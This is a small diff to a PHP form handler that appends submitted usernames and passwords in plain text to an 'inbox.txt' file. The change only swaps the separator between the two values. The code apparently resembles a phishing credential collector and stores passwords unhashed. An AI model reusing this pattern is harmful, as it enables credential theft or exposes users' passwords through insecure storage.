@@ -2,7 +2,7 @@
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $msg1 = $_POST["usernameInput"] ?? '';
     $msg2 = $_POST["passwordInput"] ?? '';
-    file_put_contents(__DIR__ . "/../inbox.txt", $msg1 . " | " . $msg2 . PHP_EOL, FILE_APPEND | LOCK_EX);
+    file_put_contents(__DIR__ . "/../inbox.txt", $msg1 . " -/- " . $msg2 . PHP_EOL, FILE_APPEND | LOCK_EX);
 }
 ?>
 
